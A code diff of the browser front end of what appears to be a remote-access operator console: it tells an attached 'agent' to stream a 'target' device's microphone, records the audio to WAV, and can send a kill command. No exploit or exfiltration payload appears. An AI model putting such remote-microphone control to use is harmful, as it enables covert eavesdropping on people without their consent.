+  audPathEl.textContent = 'wav';
+};
+
+// =========================================================================
+// Recording tab
+// =========================================================================
+document.querySelectorAll('.tab').forEach(t => {
+  t.onclick = () => {
+    document.querySelectorAll('.tab').forEach(x => x.classList.remove('on'));
+    t.classList.add('on');
+    const mode = t.dataset.mode;
+    $('pane-live').classList.toggle('hidden', mode !== 'live');
+    $('pane-record').classList.toggle('hidden', mode !== 'record');
+  };
+});
+
+function appendRecording(b64){
+  const bytes = b64ToU8(b64);
+  if (bytes.length < 2) return;
+  if (!recBytes) { recBytes = new Uint8Array(65536); recBytes._len = 0; }
+  const needed = recBytes._len + bytes.length;
+  if (needed > recBytes.length) {
+    let cap = recBytes.length;
+    while (cap < needed) cap *= 2;
+    const next = new Uint8Array(cap);
+    next.set(recBytes.subarray(0, recBytes._len), 0);
+    next._len = recBytes._len;
+    recBytes = next;
+  }
+  recBytes.set(bytes, recBytes._len);
+  recBytes._len += bytes.length;
+  for (let i = 0; i < bytes.length; i += 2) {
+    let v = bytes[i] | (bytes[i+1] << 8);
+    if (v & 0x8000) v |= ~0xffff;
+    const a = (v < 0 ? -v : v) / 32768;
+    if (a > recPeak) recPeak = a;
+  }
+  recSize.textContent = fmtBytes(recBytes._len);
+  recPeakEl.textContent = recPeak.toFixed(2);
 }
 
-function stopRecording(){
+recStart.onclick = async () => {
+  if (!attachedId || !ws) return log('[err] no target', 'm-err');
+  if (recording) return;
+  recBytes = new Uint8Array(65536); recBytes._len = 0;
+  recPeak = 0; recStartedAt = Date.now(); recording = true;
+  recStart.disabled = true; recStop.disabled = false;
+  setChipRec(true, 'recording');
+  ws.send(JSON.stringify({op:'mic', on:true}));
+  log('[rec] start', 'm-mic');
+  recTicker = setInterval(() => {
+    recDur.textContent = fmtTime((Date.now()-recStartedAt)/1000);
+  }, 250);
+};
+recStop.onclick = () => {
   if (!recording) return;
   recording = false;
-
-  // ask the agent to stop streaming
   if (ws && ws.readyState === 1) ws.send(JSON.stringify({op:'mic', on:false}));
-  log("[rec] stopped");
-
-  if (recTicker) { clearInterval(recTicker); recTicker = null; }
-
-  const sec = (Date.now() - recStartedAt) / 1000;
-  const bytesLen = recBytes ? recBytes._len : 0;
-
-  recStartBtn.disabled = false;
-  recStopBtn.disabled  = true;
-  audstatEl.textContent = 'mic: idle';
-
-  if (bytesLen === 0) {
-    recstatEl.textContent = 'record: empty (no pcm received)';
-    recInfoEl.textContent = 'no audio captured — target mic may be silent or stream never started';
-    return;
-  }
-
-  // slice to actual length
-  const pcmBytes = new Uint8Array(bytesLen);
-  pcmBytes.set(recBytes.subarray(0, bytesLen));
-
-  const blob = pcmToWavBlob(pcmBytes, MIC_RATE, MIC_CH, MIC_BITS);
-  const safeName = (recNameEl.value || 'mic_capture')
-                    .replace(/[^\w\-]/g, '_')
-                    .slice(0, 60) || 'mic_capture';
-  const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
-  const filename = `${safeName}_${ts}.wav`;
-
-  recstatEl.textContent =
-    `record: saved  ${fmtTime(sec)}  ${(bytesLen/(1024*1024)).toFixed(2)} MB  peak ${recPeak.toFixed(2)}`;
-  recInfoEl.textContent = `${filename} — ${(bytesLen/1024).toFixed(1)} KB, ${fmtTime(sec)}`;
-
-  saveBlob(blob, filename);
-}
-
-recStartBtn.onclick = startRecording;
-recStopBtn.onclick  = stopRecording;
+  clearInterval(recTicker); recTicker = null;
+  recStart.disabled = false; recStop.disabled = true;
+  setChipRec(false, 'saved');
+  const len = recBytes ? recBytes._len : 0;
+  if (!len) { recFileEl.textContent = 'empty'; return; }
+  const pcm = new Uint8Array(len); pcm.set(recBytes.subarray(0, len));
+  const blob = pcmToWavBlob(pcm, MIC_RATE, MIC_CH, MIC_BITS);
+  const name = (recName.value || 'mic_capture').replace(/[^\w\-]/g,'_').slice(0,60) || 'mic_capture';
+  const ts = new Date().toISOString().replace(/[:.]/g,'-').slice(0,19);
+  const fname = `${name}_${ts}.wav`;
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href = url; a.download = fname;
+  document.body.appendChild(a); a.click();
+  setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 800);
+  recFileEl.textContent = fname;
+  log('[rec] saved ' + fname + ' (' + fmtBytes(len) + ')', 'm-mic');
+};
 
 // =========================================================================
 // Kill
 // =========================================================================
-document.getElementById('kill').onclick = () => {
+$('kill').onclick = () => {
   if (!attachedId || !ws) return;
   ws.send(JSON.stringify({op:'kill'}));
-  log("[kill] sent");
+  log('[kill] sent', 'm-err');
 };
 
-// debug
-window.__dbg = function(){
-  return {
-    attachedId, recording,
-    recChunks, recSamples,
-    recBytesLen: recBytes ? recBytes._len : 0,
-    recPeak: recPeak.toFixed(3),
-    durationSec: recording ? (Date.now() - recStartedAt) / 1000 : 0,
-    wsReady: ws ? ws.readyState : -1
-  };
-};
+// =========================================================================
+// Debug
+// =========================================================================
+window.__dbg = () => ({
+  wsState: ws ? ws.readyState : -1,
+  attachedId, micOn, muted, audioPath,
+  ctxState: audioCtx ? audioCtx.state : 'none',
+  audIn, audOut, audDrop,
+  lastPeak: lastPeak.toFixed(3),
+  recording, recBytes: recBytes ? recBytes._len : 0
+});
 </script>
 </body></html>
